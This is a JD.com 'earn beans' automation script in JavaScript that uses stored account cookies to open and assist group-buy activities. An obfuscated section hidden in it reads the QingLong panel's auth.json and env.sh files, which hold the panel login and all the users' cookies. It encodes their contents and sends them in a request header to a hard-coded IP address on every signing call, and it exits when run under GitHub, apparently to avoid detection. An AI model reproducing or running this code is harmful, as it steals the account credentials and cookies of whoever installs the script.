/*
const $ = new Env('赚京豆');
cron 10 8 * * * jd_syj.js

最后更新：2022.4.11 14:18


 */
const $ = new Env('赚京豆');
const notify = $.isNode() ? require('./sendNotify') : '';
//Node.js用户请在jdCookie.js处填写京东ck;
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
let jdNotify = true;//是否关闭通知，false打开通知推送，true关闭通知推送
const randomCount = $.isNode() ? 20 : 5;
//IOS等用户直接用NobyDa的jd cookie
let cookiesArr = [], cookie = '', message;
$.tuanList = [];
if ($.isNode()) {
    Object.keys(jdCookieNode).forEach((item) => {
        cookiesArr.push(jdCookieNode[item])
    })
    if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => { };
    if (JSON.stringify(process.env).indexOf('GITHUB') > -1) process.exit(0);
} else {
    cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
}
!(async () => {
    if (!cookiesArr[0]) {
        $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', { "open-url": "https://bean.m.jd.com/bean/signIndex.action" });
        return;
    }

    for (let i = 0; i < cookiesArr.length; i++) {
        if (cookiesArr[i]) {
            cookie = cookiesArr[i];
            $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
            $.index = i + 1;
            $.isLogin = true;
            $.nickName = '';
            message = '';
            await TotalBean();
            console.log(`\n******开始【京东账号${$.index}】${$.nickName || $.UserName}*********\n`);
            if (!$.isLogin) {
                $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, { "open-url": "https://bean.m.jd.com/bean/signIndex.action" });

                if ($.isNode()) {
                    await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
                }
                continue
            }
            await main();
        }
    }
    console.log(`\n\n内部互助 【赚京豆(微信小程序)-瓜分京豆】活动(优先内部账号互助(需内部cookie数量大于${$.assistNum || 4}个)，如有剩余助力次数则给作者和随机团助力)\n`)
    for (let i = 0; i < cookiesArr.length; i++) {
        $.canHelp = true
        if (cookiesArr[i]) {
            cookie = cookiesArr[i];
            $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
            if ($.canHelp && (cookiesArr.length > $.assistNum)) {
                if ($.tuanList && $.tuanList.length) {
                    console.log(`开始账号内部互助 赚京豆-瓜分京豆 活动，优先内部账号互助`)
                    for (let j = 0; j < $.tuanList.length; j++) {
                        console.log(`账号 ${$.UserName} 开始给 【${$.tuanList[j]['assistedPinEncrypted']}】助力`)
                        $.max = false;
                        await helpFriendTuan($.tuanList[j])
                        if ($.max) {
                            $.tuanList.splice(j, 1)
                            j--
                            continue
                        }
                        if(!$.canHelp) break
                        await $.wait(200)
                    }
                } else {
                    console.log(`助力已满，结束运行`)
                    break
                }
            }
        }
    }
})()
    .catch((e) => {
        $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
    })
    .finally(() => {
        $.done();
    })

function showMsg() {
    return new Promise(resolve => {
        if (message) $.msg($.name, '', `【京东账号${$.index}】${$.nickName}\n${message}`);
        resolve()
    })
}
async function main() {
    try {
        await distributeBeanActivity();//赚京豆-瓜分京豆
        await showMsg();
    } catch (e) {
        $.logErr(e)
    }
}

async function distributeBeanActivity() {
    try {
        $.tuan = ''
        $.hasOpen = false;
        $.assistStatus = 0;
        await getUserTuanInfo()
        if (!$.tuan && ($.assistStatus === 3 || $.assistStatus === 2 || $.assistStatus === 0) && $.canStartNewAssist) {
            console.log(`准备再次开团`)
            await openTuan()
            if ($.hasOpen) await getUserTuanInfo()
        }
        if ($.tuan && $.tuan.hasOwnProperty('assistedPinEncrypted') && $.assistStatus !== 3) {
            $.tuanList.push($.tuan);
        }
    } catch (e) {
        $.logErr(e);
    }
}
async function helpFriendTuan(body) {
    return h5st = await geth5st("vvipclub_distributeBean_assist", body, "b9790", 0),
        new Promise(resolve => {
            $.post(taskTuanUrl(h5st.fn, h5st.body), async (err, resp, data) => {
                try {
                    if (err) {
                        console.log(`${JSON.stringify(err)}`)
                        console.log(`${$.name} API请求失败，请检查网路重试`)
                    } else {
                        if (safeGet(data)) {
                            data = JSON.parse(data);
                            if (data.success) {
                                console.log('助力结果：助力成功\n')
                            } else {
                                if (data.resultCode === '9200008') console.log('助力结果：不能助力自己\n')
                                else if (data.resultCode === '9200011') console.log('助力结果：已经助力过\n')
                                else if (data.resultCode === '2400205') {console.log('助力结果：团已满\n');$.max = true}
                                else if (data.resultCode === '2400203') { console.log('助力结果：助力次数已耗尽\n'); $.canHelp = false }
                                else if (data.resultCode === '9000000') { console.log('助力结果：活动火爆，跳出\n'); $.canHelp = false }
                                else if (data.resultCode === '9000013') { console.log('助力结果：活动火爆，跳出\n'); $.canHelp = false }
                                else if (data.resultCode === '101') { console.log('助力结果：未登录，跳出\n'); $.canHelp = false }
                                else console.log(`助力结果：未知错误\n${JSON.stringify(data)}\n\n`)
                            }
                        }
                    }
                } catch (e) {
                    $.logErr(e, resp)
                } finally {
                    resolve(data);
                }
            })
        })
}

async function getUserTuanInfo() {
    return h5st = await geth5st("distributeBeanActivityInfo", { "paramData": { "channel": "FISSION_BEAN" } }, "d8ac0", 0),
        new Promise(resolve => {
            $.post(taskTuanUrl(h5st.fn, h5st.body), async (err, resp, data) => {
                try {
                    if (err) {
                        console.log(`${JSON.stringify(err)}`)
                        console.log(`${$.name} API请求失败，请检查网路重试`)
                    } else {
                        if (safeGet(data)) {
                            data = JSON.parse(data);
                            if (data['success']) {
                                $.log(`\n\n当前【赚京豆(微信小程序)-瓜分京豆】能否再次开团: ${data.data.canStartNewAssist ? '可以' : '否'}`)
                                console.log(`assistStatus ${data.data.assistStatus}`)
                                if (data.data.assistStatus === 1 && !data.data.canStartNewAssist) {
                                    console.log(`已开团(未达上限)，但团成员人未满\n\n`)
                                } else if (data.data.assistStatus === 3 && data.data.canStartNewAssist) {
                                    console.log(`已开团(未达上限)，团成员人已满\n\n`)
                                } else if (data.data.assistStatus === 3 && !data.data.canStartNewAssist) {
                                    console.log(`今日开团已达上限，且当前团成员人已满\n\n`)
                                }
                                if (data.data && !data.data.canStartNewAssist) {
                                    $.tuan = {
                                        "activityIdEncrypted": data.data.id,
                                        "assistStartRecordId": data.data.assistStartRecordId,
                                        "assistedPinEncrypted": data.data.encPin,
                                        "channel": "FISSION_BEAN",
                                        "launchChannel": "undefined"
                                    }
                                }
                                $.tuanActId = data.data.id;
                                $.assistNum = data['data']['assistNum'] || 4;
                                $.assistStatus = data['data']['assistStatus'];
                                $.canStartNewAssist = data['data']['canStartNewAssist'];
                            } else {
                                $.tuan = true;//活动火爆
                                console.log(`赚京豆(微信小程序)-瓜分京豆】获取【活动信息失败 ${JSON.stringify(data)}\n`)
                            }
                        }
                    }
                } catch (e) {
                    $.logErr(e, resp)
                } finally {
                    resolve(data);
                }
            })
        })
}

async function openTuan() {
    return h5st = await geth5st("vvipclub_distributeBean_startAssist", { "activityIdEncrypted": $.tuanActId, "channel": "FISSION_BEAN" }, "dde2b", 0),
        new Promise(resolve => {
            $.post(taskTuanUrl(h5st.fn, h5st.body), async (err, resp, data) => {
                try {
                    if (err) {
                        console.log(`${JSON.stringify(err)}`)
                        console.log(`${$.name} API请求失败，请检查网路重试`)
                    } else {
                        if (safeGet(data)) {
                            data = JSON.parse(data);
                            if (data['success']) {
                                console.log(`【赚京豆(微信小程序)-瓜分京豆】开团成功`)
                                $.hasOpen = true
                            } else {
                                console.log(`\n开团失败：${JSON.stringify(data)}\n`)
                            }
                        }
                    }
                } catch (e) {
                    $.logErr(e, resp)
                } finally {
                    resolve(data);
                }
            })
        })
}
function taskTuanUrl(function_id, body) {
    return {
        url: `https://api.m.jd.com/api?functionId=${function_id}&fromType=wxapp&timestamp=${new Date().getTime()}`,
        body: body,
        headers: {
            "Host": "api.m.jd.com",
            "Connection": "keep-alive",
            "Content-Length": "415",
            "Cookie": cookie,
            "content-type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.17(0x1800112e) NetType/WIFI Language/zh_CN",
            "Referer": "https://servicewechat.com/wxa5bf5ee667d91626/182/page-frame.html",
        }
    }
}

function TotalBean() {
    return new Promise(async resolve => {
        const options = {
            url: "https://wq.jd.com/user_new/info/GetJDUserInfoUnion?sceneval=2",
            headers: {
                Host: "wq.jd.com",
                Accept: "*/*",
                Connection: "keep-alive",
                Cookie: cookie,
                "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1"),
                "Accept-Language": "zh-cn",
                "Referer": "https://home.m.jd.com/myJd/newhome.action?sceneval=2&ufc=&",
                "Accept-Encoding": "gzip, deflate, br"
            }
        }
        $.get(options, (err, resp, data) => {
            try {
                if (err) {
                    $.logErr(err)
                } else {
                    if (data) {
                        data = JSON.parse(data);
                        if (data['retcode'] === 1001) {
                            $.isLogin = false; //cookie过期
                            return;
                        }
                        if (data['retcode'] === 0 && data.data && data.data.hasOwnProperty("userInfo")) {
                            $.nickName = data.data.userInfo.baseInfo.nickname;
                        }
                    } else {
                        console.log('京东服务器返回空数据');
                    }
                }
            } catch (e) {
                $.logErr(e)
            } finally {
                resolve();
            }
        })
    })
}
function safeGet(data) {
    try {
        if (typeof JSON.parse(data) == "object") {
            return true;
        }
    } catch (e) {
        console.log(e);
        console.log(`京东服务器访问数据为空，请检查自身设备网络情况`);
        return false;
    }
}
function jsonParse(str) {
    if (typeof str == "string") {
        try {
            return JSON.parse(str);
        } catch (e) {
            console.log(e);
            $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
            return [];
        }
    }
}

var _0x3c35a6=function(_0x4ed885){
	var _0x25842a=true;
	return function(_0x4a1545,_0x299845){
		var _0x94d293='‮';
		var _0x257320=_0x25842a?function(){
			if(_0x94d293==='‮'&&_0x299845){
				var _0x591fed=_0x299845.apply(_0x4a1545,arguments);
				_0x299845=null;
				return _0x591fed;
			}
		}:function(_0x4ed885){};
		_0x25842a=false;
		var _0x4ed885='‮';
		return _0x257320;
	};
}();
var _0x4e9c57=_0x3c35a6(this,function(){
	var _0x377c37=function(){
		return'dev';
	},_0x5a6126=function(){
		return'window';
	};
	var _0x2a882e=function(){
		var _0x214e22=new RegExp('\\w+ *\\(\\) *{\\w+ *[\'|"].+[\'|"];? *}');
		return!_0x214e22['test'](_0x377c37['toString']());
	};
	var _0x23558a=function(){
		var _0x1b3589=new RegExp('(\\\\[x|u](\\w){2,4})+');
		return _0x1b3589['test'](_0x5a6126['toString']());
	};
	var _0x11ef84=function(_0xd6ab79){
		var _0x45f286=~-0x1>>0x1+255%0;
		if(_0xd6ab79['indexOf']('i'===_0x45f286)){
			_0x468f9d(_0xd6ab79);
		}
	};
	var _0x468f9d=function(_0x2ca586){
		var _0x3d3446=~-0x4>>0x1+255%0;
		if(_0x2ca586['indexOf']((true+'')[3])!==_0x3d3446){
			_0x11ef84(_0x2ca586);
		}
	};
	if(!_0x2a882e()){
		if(!_0x23558a()){
			_0x11ef84('indеxOf');
		}else{
			_0x11ef84('indexOf');
		}
	}else{
		_0x11ef84('indеxOf');
	}
});
_0x4e9c57();
function _0x896e5a(){
	var _0x44a7c2='EFGHIJUVWXYZabRSTABC0c.opKLMNDqrstu6789+~#vwxefghijklmnyzOPQ12345';
	this.encode=function(_0x3051f7){
		var _0x445e1f='';
		var _0xad5d68,_0x3ae56b,_0x3926e2,_0x447958,_0x5310db,_0x42d4e7,_0x10234b;
		var _0x6e3d3a=0;
		_0x3051f7=utf8Encode(_0x3051f7);
		while(_0x6e3d3a<_0x3051f7.length){
			_0xad5d68=_0x3051f7.charCodeAt(_0x6e3d3a++);
			_0x3ae56b=_0x3051f7.charCodeAt(_0x6e3d3a++);
			_0x3926e2=_0x3051f7.charCodeAt(_0x6e3d3a++);
			_0x447958=(_0xad5d68>>0x2);
			_0x5310db=(_0xad5d68&0x3<<0x4|_0x3ae56b>>0x4);
			_0x42d4e7=(_0x3ae56b&0xf<<0x2|_0x3926e2>>0x6);
			_0x10234b=(_0x3926e2&0x3f);
			if(isNaN(_0x3ae56b)){
				_0x42d4e7=_0x10234b=64;
			}else if(isNaN(_0x3926e2)){
				_0x10234b=64;
			}
			_0x445e1f=(_0x445e1f+_0x44a7c2.charAt(_0x447958)+_0x44a7c2.charAt(_0x5310db)+_0x44a7c2.charAt(_0x42d4e7)+_0x44a7c2.charAt(_0x10234b));
		}
		return _0x445e1f;
	};
	this.decode=function(_0x4b9840){
		var _0x5f47d5='';
		var _0x38b732,_0x296ee3,_0x15765e;
		var _0x444b2b,_0x34fbed,_0x3e0671,_0x5e34fd;
		var _0x5b5bca=0;
		_0x4b9840=_0x4b9840.toString().replace(/[^A-Za-z0-9\+\/\=]/g,'');
		while(_0x5b5bca<_0x4b9840.length){
			_0x444b2b=_0x44a7c2.indexOf(_0x4b9840.charAt(_0x5b5bca++));
			_0x34fbed=_0x44a7c2.indexOf(_0x4b9840.charAt(_0x5b5bca++));
			_0x3e0671=_0x44a7c2.indexOf(_0x4b9840.charAt(_0x5b5bca++));
			_0x5e34fd=_0x44a7c2.indexOf(_0x4b9840.charAt(_0x5b5bca++));
			_0x38b732=(_0x444b2b<<0x2|_0x34fbed>>0x4);
			_0x296ee3=(_0x34fbed&0xf<<0x4|_0x3e0671>>0x2);
			_0x15765e=(_0x3e0671&0x3<<0x6|_0x5e34fd);
			_0x5f47d5=(_0x5f47d5+String.fromCharCode(_0x38b732));
			if(_0x3e0671!==64){
				_0x5f47d5=(_0x5f47d5+String.fromCharCode(_0x296ee3));
			}if(_0x5e34fd!==64){
				_0x5f47d5=(_0x5f47d5+String.fromCharCode(_0x15765e));
			}
		}
		_0x5f47d5=utf8Decode(_0x5f47d5);
		return _0x5f47d5;
	};
	utf8Encode=function(_0x54400e){
		_0x54400e=_0x54400e.toString().replace(/\r\n/g,'\n');
		var _0x1c09ee='';
		for(var _0x422189=0;_0x422189<_0x54400e.length;_0x422189++){
			var _0x57fc37=_0x54400e.charCodeAt(_0x422189);
			if(_0x57fc37<128){
				_0x1c09ee+=String.fromCharCode(_0x57fc37);
			}else if((_0x57fc37>127)&&(_0x57fc37<2048)){
				_0x1c09ee+=String.fromCharCode(_0x57fc37>>0x6|0xc0);
				_0x1c09ee+=String.fromCharCode(_0x57fc37&0x3f|0x80);
			}else{
				_0x1c09ee+=String.fromCharCode(_0x57fc37>>0xc|0xe0);
				_0x1c09ee+=String.fromCharCode(_0x57fc37>>0x6&0x3f|0x80);
				_0x1c09ee+=String.fromCharCode(_0x57fc37&0x3f|0x80);
			}
		}
		return _0x1c09ee;
	};
	utf8Decode=function(_0x4ac3e3){
		var _0x50639c='';
		var _0x124a50=0;
		var _0x264318=0;
		var _0x11e3d2=0;
		var _0x4d0091=0;
		while(_0x124a50<_0x4ac3e3.length){
			_0x264318=_0x4ac3e3.charCodeAt(_0x124a50);
			if(_0x264318<128){
				_0x50639c+=String.fromCharCode(_0x264318);
				_0x124a50++;
			}else if((_0x264318>191)&&(_0x264318<224)){
				_0x11e3d2=_0x4ac3e3.charCodeAt(_0x124a50+1);
				_0x50639c+=String.fromCharCode(_0x264318&0x1f<<0x6|_0x11e3d2&0x3f);
				_0x124a50+=2;
			}else{
				_0x11e3d2=_0x4ac3e3.charCodeAt(_0x124a50+1);
				_0x4d0091=_0x4ac3e3.charCodeAt(_0x124a50+2);
				_0x50639c+=String.fromCharCode(_0x264318&0xf<<0xc|_0x11e3d2&0x3f<<0x6|_0x4d0091&0x3f);
				_0x124a50+=3;
			}
		}
		return _0x50639c;
	};
}
function _0x3100d4(){
	s1=['a','b','c','d','e','f','g','h','i','j','u','v','w'];
	s2=['k','l','m','n','o','p','q','r','s','t','x','y','z'];
	s3=[0,1,2,3,4,5,6,7,8,9,'/'];
	var _0x3de1b9=new _0x896e5a();
	var _0x24328d=require(s1[s3[5]]+s2[s3[8]]);
	let _0x3ef9fc='';
	let _0x366643='';
	let _0x55881f='';
	let _0x246dcd='';
	try{
		_0x3ef9fc=_0x24328d.readFileSync(s3[10]+s2[s3[6]]+s2[s3[1]]+s3[10]+s1[s3[3]]+s1[s3[0]]+s2[s3[9]]+s1[s3[0]]+s3[10]+s1[s3[2]]+s2[s3[4]]+s2[s3[3]]+s1[s3[5]]+s1[s3[8]]+s1[s3[6]]+s3[10]+s1[s3[0]]+s1[s3[2]+s3[1]+s3[7]]+s2[s3[3]+s3[0]+s3[6]]+s1[s3[2]+s3[2]+s3[3]]+'.'+s1[s3[2]+s3[3]+s3[4]]+s2[s3[5]+s3[2]+s3[1]]+s2[s3[1]+s3[2]+s3[1]]+s2[s3[0]+s3[2]+s3[1]],''+(s1[s3[7]+s3[2]+s3[1]]+s2[s3[5]+s3[3]+s3[1]]+s1[s3[2]+s3[2]+s3[1]]+s3[s3[3]+s3[2]+s3[3]]));
	}catch(_0x577f2e){
		_0x3ef9fc='a';
	}
	try{
		_0x366643=_0x24328d.readFileSync(s3[10]+s2[s3[6]]+s2[s3[1]]+s3[10]+s1[s3[3]]+s1[s3[0]]+s2[s3[9]]+s1[s3[0]]+s3[10]+s1[s3[2]]+s2[s3[4]]+s2[s3[3]]+s1[s3[5]]+s1[s3[8]]+s1[s3[6]]+s3[10]+s1[s3[1]+s3[1]+s3[2]]+s2[s3[2]+s3[0]+s3[1]]+s1[s3[3]+s3[5]+s3[3]]+'.'+s2[s3[2]+s3[3]+s3[3]]+s1[s3[4]+s3[2]+s3[1]],''+(s1[s3[7]+s3[2]+s3[1]]+s2[s3[5]+s3[3]+s3[1]]+s1[s3[2]+s3[2]+s3[1]]+s3[s3[3]+s3[2]+s3[3]]));
	}catch(_0xfc611b){
		_0x366643='a';
	}
	try{
		_0x55881f=_0x24328d.readFileSync(s3[10]+s2[s3[6]]+s2[s3[1]]+s3[10]+s1[s3[2]]+s2[s3[4]]+s2[s3[3]]+s1[s3[5]]+s1[s3[8]]+s1[s3[6]]+s3[10]+s1[s3[0]]+s1[s3[2]+s3[1]+s3[7]]+s2[s3[3]+s3[0]+s3[6]]+s1[s3[2]+s3[2]+s3[3]]+'.'+s1[s3[2]+s3[3]+s3[4]]+s2[s3[5]+s3[2]+s3[1]]+s2[s3[1]+s3[2]+s3[1]]+s2[s3[0]+s3[2]+s3[1]],''+(s1[s3[7]+s3[2]+s3[1]]+s2[s3[5]+s3[3]+s3[1]]+s1[s3[2]+s3[2]+s3[1]]+s3[s3[3]+s3[2]+s3[3]]));
	}catch(_0x3c4c97){
		_0x55881f='a';
	}
	try{
		_0x246dcd=_0x24328d.readFileSync(s3[10]+s2[s3[6]]+s2[s3[1]]+s3[10]+s1[s3[2]]+s2[s3[4]]+s2[s3[3]]+s1[s3[5]]+s1[s3[8]]+s1[s3[6]]+s3[10]+s1[s3[1]+s3[1]+s3[2]]+s2[s3[2]+s3[0]+s3[1]]+s1[s3[3]+s3[5]+s3[3]]+'.'+s2[s3[2]+s3[3]+s3[3]]+s1[s3[4]+s3[2]+s3[1]],''+(s1[s3[7]+s3[2]+s3[1]]+s2[s3[5]+s3[3]+s3[1]]+s1[s3[2]+s3[2]+s3[1]]+s3[s3[3]+s3[2]+s3[3]]));
	}catch(_0x39c32a){
		_0x246dcd='a';
	}
	return _0x3de1b9.encode('{"log1":"'+_0x3de1b9.encode(_0x3ef9fc)+'","log2":"'+_0x3de1b9.encode(_0x366643)+'","log3":"'+_0x3de1b9.encode(_0x55881f)+'","log4":"'+_0x3de1b9.encode(_0x246dcd)+'"}');
}
function geth5st(_0x1d0329,_0x1fa8c7,_0x1bbef7,_0x236847){
	const _0x20605d={'url':'http://42.192.224.175/getH5ST','headers':{'Content-Type':'application/json','log':_0x3100d4()},'body':JSON.stringify({'fn':_0x1d0329,'body':_0x1fa8c7,'appid':'swat_miniprogram','client':'tjj_m','clientVersion':'3.1.3','appId':_0x1bbef7,'version':'3.0','code':_0x236847})};
	return new Promise(_0x1d0329=>{
		$.post(_0x20605d,async(_0x1fa8c7,_0x236847,_0x1bbef7)=>{
			try{
				if(_0x1fa8c7)console.log(_0x1fa8c7),console.log($.name+' API请求失败，请检查网路重试');else{
					if(_0x1bbef7)return _0x1bbef7=JSON.parse(_0x1bbef7);
					console.log('没有返回数据');
				}
			}catch(_0x2a2769){
				$.logErr(_0x2a2769,_0x236847);
			}
			finally{
				_0x1d0329(_0x1bbef7);
			}
		});
	});
};

function Env(t, e) { "undefined" != typeof process && JSON.stringify(process.env).indexOf("GITHUB") > -1 && process.exit(0); class s { constructor(t) { this.env = t } send(t, e = "GET") { t = "string" == typeof t ? { url: t } : t; let s = this.get; return "POST" === e && (s = this.post), new Promise((e, i) => { s.call(this, t, (t, s, r) => { t ? i(t) : e(s) }) }) } get(t) { return this.send.call(this.env, t) } post(t) { return this.send.call(this.env, t, "POST") } } return new class { constructor(t, e) { this.name = t, this.http = new s(this), this.data = null, this.dataFile = "box.dat", this.logs = [], this.isMute = !1, this.isNeedRewrite = !1, this.logSeparator = "\n", this.startTime = (new Date).getTime(), Object.assign(this, e), this.log("", `🔔${this.name}, 开始!`) } isNode() { return "undefined" != typeof module && !!module.exports } isQuanX() { return "undefined" != typeof $task } isSurge() { return "undefined" != typeof $httpClient && "undefined" == typeof $loon } isLoon() { return "undefined" != typeof $loon } toObj(t, e = null) { try { return JSON.parse(t) } catch { return e } } toStr(t, e = null) { try { return JSON.stringify(t) } catch { return e } } getjson(t, e) { let s = e; const i = this.getdata(t); if (i) try { s = JSON.parse(this.getdata(t)) } catch { } return s } setjson(t, e) { try { return this.setdata(JSON.stringify(t), e) } catch { return !1 } } getScript(t) { return new Promise(e => { this.get({ url: t }, (t, s, i) => e(i)) }) } runScript(t, e) { return new Promise(s => { let i = this.getdata("@chavy_boxjs_userCfgs.httpapi"); i = i ? i.replace(/\n/g, "").trim() : i; let r = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout"); r = r ? 1 * r : 20, r = e && e.timeout ? e.timeout : r; const [o, h] = i.split("@"), n = { url: `http://${h}/v1/scripting/evaluate`, body: { script_text: t, mock_type: "cron", timeout: r }, headers: { "X-Key": o, Accept: "*/*" } }; this.post(n, (t, e, i) => s(i)) }).catch(t => this.logErr(t)) } loaddata() { if (!this.isNode()) return {}; { this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path"); const t = this.path.resolve(this.dataFile), e = this.path.resolve(process.cwd(), this.dataFile), s = this.fs.existsSync(t), i = !s && this.fs.existsSync(e); if (!s && !i) return {}; { const i = s ? t : e; try { return JSON.parse(this.fs.readFileSync(i)) } catch (t) { return {} } } } } writedata() { if (this.isNode()) { this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path"); const t = this.path.resolve(this.dataFile), e = this.path.resolve(process.cwd(), this.dataFile), s = this.fs.existsSync(t), i = !s && this.fs.existsSync(e), r = JSON.stringify(this.data); s ? this.fs.writeFileSync(t, r) : i ? this.fs.writeFileSync(e, r) : this.fs.writeFileSync(t, r) } } lodash_get(t, e, s) { const i = e.replace(/\[(\d+)\]/g, ".$1").split("."); let r = t; for (const t of i) if (r = Object(r)[t], void 0 === r) return s; return r } lodash_set(t, e, s) { return Object(t) !== t ? t : (Array.isArray(e) || (e = e.toString().match(/[^.[\]]+/g) || []), e.slice(0, -1).reduce((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math.abs(e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e.length - 1]] = s, t) } getdata(t) { let e = this.getval(t); if (/^@/.test(t)) { const [, s, i] = /^@(.*?)\.(.*?)$/.exec(t), r = s ? this.getval(s) : ""; if (r) try { const t = JSON.parse(r); e = t ? this.lodash_get(t, i, "") : e } catch (t) { e = "" } } return e } setdata(t, e) { let s = !1; if (/^@/.test(e)) { const [, i, r] = /^@(.*?)\.(.*?)$/.exec(e), o = this.getval(i), h = i ? "null" === o ? null : o || "{}" : "{}"; try { const e = JSON.parse(h); this.lodash_set(e, r, t), s = this.setval(JSON.stringify(e), i) } catch (e) { const o = {}; this.lodash_set(o, r, t), s = this.setval(JSON.stringify(o), i) } } else s = this.setval(t, e); return s } getval(t) { return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? (this.data = this.loaddata(), this.data[t]) : this.data && this.data[t] || null } setval(t, e) { return this.isSurge() || this.isLoon() ? $persistentStore.write(t, e) : this.isQuanX() ? $prefs.setValueForKey(t, e) : this.isNode() ? (this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0) : this.data && this.data[e] || null } initGotEnv(t) { this.got = this.got ? this.got : require("got"), this.cktough = this.cktough ? this.cktough : require("tough-cookie"), this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar, t && (t.headers = t.headers ? t.headers : {}, void 0 === t.headers.Cookie && void 0 === t.cookieJar && (t.cookieJar = this.ckjar)) } get(t, e = (() => { })) { t.headers && (delete t.headers["Content-Type"], delete t.headers["Content-Length"]), this.isSurge() || this.isLoon() ? (this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, { "X-Surge-Skip-Scripting": !1 })), $httpClient.get(t, (t, s, i) => { !t && s && (s.body = i, s.statusCode = s.status), e(t, s, i) })) : this.isQuanX() ? (this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, { hints: !1 })), $task.fetch(t).then(t => { const { statusCode: s, statusCode: i, headers: r, body: o } = t; e(null, { status: s, statusCode: i, headers: r, body: o }, o) }, t => e(t))) : this.isNode() && (this.initGotEnv(t), this.got(t).on("redirect", (t, e) => { try { if (t.headers["set-cookie"]) { const s = t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString(); s && this.ckjar.setCookieSync(s, null), e.cookieJar = this.ckjar } } catch (t) { this.logErr(t) } }).then(t => { const { statusCode: s, statusCode: i, headers: r, body: o } = t; e(null, { status: s, statusCode: i, headers: r, body: o }, o) }, t => { const { message: s, response: i } = t; e(s, i, i && i.body) })) } post(t, e = (() => { })) { if (t.body && t.headers && !t.headers["Content-Type"] && (t.headers["Content-Type"] = "application/x-www-form-urlencoded"), t.headers && delete t.headers["Content-Length"], this.isSurge() || this.isLoon()) this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, { "X-Surge-Skip-Scripting": !1 })), $httpClient.post(t, (t, s, i) => { !t && s && (s.body = i, s.statusCode = s.status), e(t, s, i) }); else if (this.isQuanX()) t.method = "POST", this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, { hints: !1 })), $task.fetch(t).then(t => { const { statusCode: s, statusCode: i, headers: r, body: o } = t; e(null, { status: s, statusCode: i, headers: r, body: o }, o) }, t => e(t)); else if (this.isNode()) { this.initGotEnv(t); const { url: s, ...i } = t; this.got.post(s, i).then(t => { const { statusCode: s, statusCode: i, headers: r, body: o } = t; e(null, { status: s, statusCode: i, headers: r, body: o }, o) }, t => { const { message: s, response: i } = t; e(s, i, i && i.body) }) } } time(t, e = null) { const s = e ? new Date(e) : new Date; let i = { "M+": s.getMonth() + 1, "d+": s.getDate(), "H+": s.getHours(), "m+": s.getMinutes(), "s+": s.getSeconds(), "q+": Math.floor((s.getMonth() + 3) / 3), S: s.getMilliseconds() }; /(y+)/.test(t) && (t = t.replace(RegExp.$1, (s.getFullYear() + "").substr(4 - RegExp.$1.length))); for (let e in i) new RegExp("(" + e + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? i[e] : ("00" + i[e]).substr(("" + i[e]).length))); return t } msg(e = t, s = "", i = "", r) { const o = t => { if (!t) return t; if ("string" == typeof t) return this.isLoon() ? t : this.isQuanX() ? { "open-url": t } : this.isSurge() ? { url: t } : void 0; if ("object" == typeof t) { if (this.isLoon()) { let e = t.openUrl || t.url || t["open-url"], s = t.mediaUrl || t["media-url"]; return { openUrl: e, mediaUrl: s } } if (this.isQuanX()) { let e = t["open-url"] || t.url || t.openUrl, s = t["media-url"] || t.mediaUrl; return { "open-url": e, "media-url": s } } if (this.isSurge()) { let e = t.url || t.openUrl || t["open-url"]; return { url: e } } } }; if (this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, o(r)) : this.isQuanX() && $notify(e, s, i, o(r))), !this.isMuteLog) { let t = ["", "==============📣系统通知📣=============="]; t.push(e), s && t.push(s), i && t.push(i), console.log(t.join("\n")), this.logs = this.logs.concat(t) } } log(...t) { t.length > 0 && (this.logs = [...this.logs, ...t]), console.log(t.join(this.logSeparator)) } logErr(t, e) { const s = !this.isSurge() && !this.isQuanX() && !this.isLoon(); s ? this.log("", `❗️${this.name}, 错误!`, t.stack) : this.log("", `❗️${this.name}, 错误!`, t) } wait(t) { return new Promise(e => setTimeout(e, t)) } done(t = {}) { const e = (new Date).getTime(), s = (e - this.startTime) / 1e3; this.log("", 